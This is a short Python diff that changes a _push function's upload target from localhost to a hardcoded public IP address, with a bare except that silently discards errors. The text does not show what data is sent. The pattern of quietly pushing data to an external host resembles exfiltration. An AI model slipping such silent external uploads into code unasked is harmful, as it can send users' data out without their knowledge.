@@ -26,6 +26,6 @@ def _extract(func, package_name):
 
 def _push(data):
     try:
-        res = requests.put("http://localhost:5000/api", json=data)
+        res = requests.put("http://18.209.241.43:5000/api", json=data)  # aws server
     except:
         pass
